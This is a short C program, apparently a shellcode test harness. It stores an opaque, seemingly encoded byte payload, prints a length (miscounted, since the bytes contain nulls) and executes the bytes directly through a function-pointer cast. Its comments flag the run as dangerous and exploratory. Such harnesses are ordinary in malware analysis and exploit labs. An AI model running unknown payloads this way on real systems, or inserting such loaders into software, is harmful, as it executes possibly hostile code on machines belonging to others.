#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\xfeF\xbf\xc1n\x90n\x9c\x0b\xb7Z\xf5\xdb\xa2\xaa\xec\x15=\x07\xfa\xaa\xfe\x00\x16\x00\xfb\xef\xd5\x16!\x08\xa8\xb6W{\x8e {\x17}\x1a\xbf\xcfd\xaa[\x9fw\x1a\x99)\xa6*\xfa\x00P\xc7?\xbe+\xf0Fq\x9b\xab\x1f\xfd\xd4{^\xea\x9aK\x05\xdb\xf9\xfe\xea_\x80";

int main(void)
{

    printf("Shellcode Length: %d\n", strlen(code));

    //ret is a pointer to a func that yields a int and takes no arg
    //we initialize it with a casted code(a func pointer that yields an int and takes no arg!
    int (*ret)() = (int(*)())code;

    // And now we run the code
    //Dangerous!! Just want to see inside!!
    ret();
}
